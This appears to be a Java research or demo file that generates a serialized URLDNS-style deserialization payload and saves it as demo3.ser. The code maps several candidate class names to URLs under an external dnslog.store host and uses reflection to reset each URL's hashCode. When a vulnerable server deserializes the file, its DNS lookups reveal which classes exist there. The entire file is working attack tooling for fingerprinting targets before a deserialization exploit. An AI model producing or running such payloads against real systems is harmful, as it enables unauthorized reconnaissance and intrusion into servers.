package com.demo3;

import com.demo.common.MyListClass;
import com.demo.common.Utils;

import java.lang.reflect.Field;
import java.net.URL;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import static com.demo.common.Utils.Serialize;

public class TestDemo3List {

    public static HashMap makeMap(Object targetClazz,String dnslog) throws Exception{

        HashMap<URL, Object> hashMap = new HashMap<>();
        URL url = new URL(null, "http://"+dnslog, new TestUID.SilentURLStreamHandler());

        hashMap.put( url, targetClazz);

        Field f = java.net.URL.class.getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1);
        return hashMap;
    }




    public static void add(List list, String clazzName) throws Exception{
        list.add(makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.","")+".d80b043e.dnslog.store"));
    }
    public static void add(MyListClass list, String clazzName) throws Exception{
        list.add(makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.","")+".d80b043e.dnslog.store"));
    }

    public static void main(String[] args) throws Exception {

        String file = "demo3.ser";
//        List list = new ArrayList();
////        MyListClass list = new MyListClass(10);
//        add(list, "com.demo.common.TargetDetectClass");
//        add(list, "com.demo.FooNotexist");
//        add(list, "com.demo.common.TargetDetectClass2");
//        add(list, "com.demo.FooNotexist2");

        Object[] list = new Object[10];
        String clazzName = "com.demo.common.TargetDetectClass";
        list[0] = makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.", "") + ".d80b043e.dnslog.store");
        clazzName = "com.demo.FooNotexist";
        list[1] = makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.", "") + ".d80b043e.dnslog.store");
        clazzName = "com.demo.common.TargetDetectClass2";
        list[2] = makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.", "") + ".d80b043e.dnslog.store");
        clazzName = "com.demo.FooNotexist2";
        list[3] = makeMap(Utils.MakeClass(clazzName), clazzName.replaceAll("\\.", "") + ".d80b043e.dnslog.store");

        Serialize(list, file);

        // deserialize(file);
    }


}
